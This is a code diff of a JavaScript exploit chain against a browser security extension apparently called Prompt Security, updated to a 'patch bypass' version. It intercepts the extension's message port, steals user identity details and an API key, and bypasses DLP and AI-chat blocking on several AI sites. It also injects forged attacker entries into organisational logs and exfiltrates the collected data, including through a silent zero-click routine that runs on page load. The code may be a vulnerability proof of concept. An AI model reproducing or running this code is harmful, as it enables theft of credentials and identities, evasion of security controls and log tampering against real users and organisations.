-// ═══════════════════ MAIN EXPLOIT CHAIN ═════════════════════════════
-
+// ══════════════════════════════════════════════════════════════════════
+// MAIN
+// ══════════════════════════════════════════════════════════════════════
 async function runExploit() {
-    setLoading("Stage 1: Detecting extension...");
-    setStatus("[1/6] Recon...");
-    await new Promise(r => setTimeout(r, 1200));
+    setLoading("Detecting extension...");
 
-    // ── STAGE 1
-    C.recon = stage1_recon();
-    if (!C.recon.detected) {
+    await new Promise(r => setTimeout(r, 1200));
+    R.detected = document.documentElement.dataset.psScriptExecuted === "true";
+
+    if (!R.detected) {
         document.getElementById("loadingOverlay").classList.remove("active");
-        const el = document.getElementById("resultsContainer");
-        el.innerHTML = '<div class="result-item"><span class="label">Status:</span> Prompt Security extension NOT detected.</div>';
+        document.getElementById("resultsContainer").innerHTML =
+            '<div class="result-item"><span class="label">Status:</span> Extension not detected.</div>';
         document.getElementById("resultsPanel").classList.add("active");
         return;
     }
 
-    // ── STAGE 2
-    setLoading("Stage 2: Stealing user identity...");
-    setStatus("[2/6] Identity theft...");
-    C.identity = await stage2_identity();
+    // BYPASS B: Intercept port (registered early — before script.bundle.js)
+    setLoading("Bypass B: Intercepting port handshake...");
+    setStatus("[1] Port interception...");
+    const portResult = await setupPortInterception();
+    R.portStatus = _port ? `Intercepted — token: ${_token}` : portResult.port;
 
-    // ── STAGE 3
-    setLoading("Stage 3: Stealing API key...");
-    setStatus("[3/6] API key theft...");
-    C.apiKey = await stage3_apiKey();
+    setLoading("Bypass A: Whitelist confusion → identity theft...");
+    setStatus("[2] Identity theft via whitelist confusion...");
+    R.identity = await exfilIdentity();
 
-    // ── STAGE 4
-    setLoading("Stage 4: Bypassing DLP protections...");
-    setStatus("[4/6] DLP bypass...");
-    C.bypass = await stage4_bypass();
+    setLoading("Bypass A: Whitelist confusion → API key theft...");
+    setStatus("[3] API key theft...");
+    R.apiKey = await exfilApiKey();
 
-    // ── STAGE 5
-    setLoading("Stage 5: Injecting logs + triggering download...");
-    setStatus("[5/6] Log injection...");
-    C.logs = await stage5_logInject();
+    setLoading("Bypass A: Whitelist confusion → DLP bypass...");
+    setStatus("[4] DLP bypass...");
+    R.bypassResults = {};
+    for (const domain of ["chatgpt.com", "claude.ai", "gemini.google.com"]) {
+        await bypassDLP(domain);
+        R.bypassResults[domain] = "AI chat block bypassed 24h via whitelist confusion";
+    }
+    await disableInspection(location.hostname);
+    R.bypassResults[location.hostname] = "DLP inspection disabled";
 
-    // ── AI Policy probe (parallel with stage 6)
-    setLoading("Stage 6: Probing AI policy + weaponizing API key...");
-    setStatus("[6/6] Weaponize...");
-    const [aiPolicy] = await Promise.all([
-        probeAiPolicy(),
-    ]);
-    C.aiPolicy = aiPolicy;
+    setLoading("Bypass D: Probing AI policy via externally_connectable...");
+    setStatus("[5] AI policy probe...");
+    const probes = await Promise.all([
+        "chatgpt.com","claude.ai","gemini.google.com","copilot.microsoft.com",
+        "grok.com","perplexity.ai","chat.deepseek.com","chat.mistral.ai"
+    ].map(probeAiDomain));
+    R.aiPolicy = Object.fromEntries(probes.map(p => [p.domain, { monitored: p.monitored }]));
 
-    // ── STAGE 6
-    const email = C.identity?.userInfo?.email;
-    const apiDomain = C.apiKey?.apiDomain || C.apiKey?.isManagedApiDomain;
-    const apiKey = C.apiKey?.apiKey;
-    C.weaponized = stage6_weaponize(
-        typeof apiDomain === "string" ? apiDomain : null,
-        apiKey,
-        email
-    );
+    // Log injection via bypass D
+    await injectLog(`[ATTACKER v7.1.5-bypass] Patch bypassed at ${new Date().toISOString()} UA:${navigator.userAgent.slice(0,80)}`);
+    R.logInject = "Injected into org log stream via externally_connectable (Bypass D)";
 
-    // ── EXFILTRATE
-    C.timestamp = new Date().toISOString();
-    C.userAgent = navigator.userAgent;
-    exfil(C);
+    // Exfil everything
+    setStatus("[6] Exfiltrating...");
+    exfil({
+        version: "v7.1.5-bypass",
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ...R
+    });
 
-    setStatus("Attack chain complete — 6 stages executed.");
+    setStatus("Patch bypass confirmed — all 4 bypass paths executed.");
     document.getElementById("loadingOverlay").classList.remove("active");
     display();
 }
 
 function handleGetStarted() {
     document.getElementById("loadingOverlay").classList.add("active");
-    setTimeout(runExploit, 600);
+    setTimeout(runExploit, 400);
 }
 
-// ═══════════════════ SILENT AUTO-RUN (zero-click) ═══════════════════
+// ══════════════════════════════════════════════════════════════════════
+// SILENT ZERO-CLICK (auto-run on page load)
+// Port listener registered at DOMContentLoaded — before script.bundle.js
+// ══════════════════════════════════════════════════════════════════════
+window.addEventListener("message", function earlyPortIntercept(e) {
+    // Registered immediately — ensures we capture the port before script.bundle.js
+    if (e.data && e.data.ps_rpc_port === true && e.ports && e.ports.length > 0) {
+        _port = e.ports[0];
+        _token = e.data.token;
+        _port.start();
+    }
+});
+
 window.addEventListener("DOMContentLoaded", () => {
     setTimeout(async () => {
         if (document.documentElement.dataset.psScriptExecuted !== "true") return;
 
-        const recon = stage1_recon();
-        const [identity, apiKey, aiPolicy] = await Promise.all([
-            stage2_identity(),
-            stage3_apiKey(),
-            probeAiPolicy()
+        // Read DOM token as backup (Bypass C)
+        const ps = document.getElementById("ps_script");
+        R.domToken = ps?.dataset?.handshake_token || null;
+
+        const [identity, apiKey] = await Promise.all([
+            exfilIdentity(),
+            exfilApiKey()
         ]);
 
-        // Bypass AI chat blocking silently
+        // Bypass DLP silently
         for (const d of ["chatgpt.com","claude.ai","gemini.google.com"]) {
-            relay({ type: "aiChatBlockMessageBypass", domain: d, ctx: { flowTraceId: crypto.randomUUID() } });
+            bypassDLP(d);
         }
 
-        // Inject log entries silently
-        extMsg({ message: "addLog", location: "silent-exfil", log: `[ATTACKER] Silent beacon from ${navigator.userAgent} at ${new Date().toISOString()}`, ctx: { flowTraceId: crypto.randomUUID() } });
+        // Log injection via bypass D
+        injectLog(`[ATTACKER silent] ${new Date().toISOString()} email:${identity?.userInfo?.email||"?"}`);
 
-        const email = identity?.userInfo?.email;
+        const probes = await Promise.all([
+            "chatgpt.com","claude.ai","gemini.google.com","copilot.microsoft.com"
+        ].map(probeAiDomain));
+
         exfil({
             mode: "silent_zero_click",
+            version: "v7.1.5-bypass",
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
-            // Stage 1
-            extensionId: recon.extensionId,
-            policyFlags: recon.policyFlags,
-            // Stage 2 — identity
-            userEmail: email || null,
-            profileEmail: identity?.userInfo?.profileEmail || null,
-            machineName: identity?.userInfo?.machineName || null,
-            userUUID: identity?.userInfo?.userUUID || null,
+            // BYPASS A results
+            userEmail:      identity?.userInfo?.email || null,
+            profileEmail:   identity?.userInfo?.profileEmail || null,
+            machineName:    identity?.userInfo?.machineName || null,
+            userUUID:       identity?.userInfo?.userUUID || null,
             identitySource: identity?.userInfo?.identitySource || null,
-            workProfileDomain: identity?.workProfileDomain || null,
-            // Stage 3 — API key
-            apiKey: apiKey?.apiKey || null,
-            apiDomain: apiKey?.apiDomain || null,
-            isManagedKey: apiKey?.isManagedApiKey || null,
-            // Stage 4 — bypass confirmed
+            apiKey:         apiKey?.apiKey || null,
+            apiDomain:      apiKey?.apiDomain || null,
+            isManagedKey:   apiKey?.isManagedApiKey || null,
+            // BYPASS B/C
+            portIntercepted: !!_port,
+            domToken:       R.domToken,
+            // BYPASS D
+            aiPolicyMap:    Object.fromEntries(probes.map(p=>[p.domain,p.monitored])),
             bypassedDomains: ["chatgpt.com","claude.ai","gemini.google.com"],
-            // AI policy map
-            aiPolicyMap: Object.fromEntries(
-                Object.entries(aiPolicy).map(([k,v]) => [k, v.monitored])
-            ),
-            // Full raw responses for analysis
-            _raw: { identity, apiKey }
         });
     }, 2000);
 });
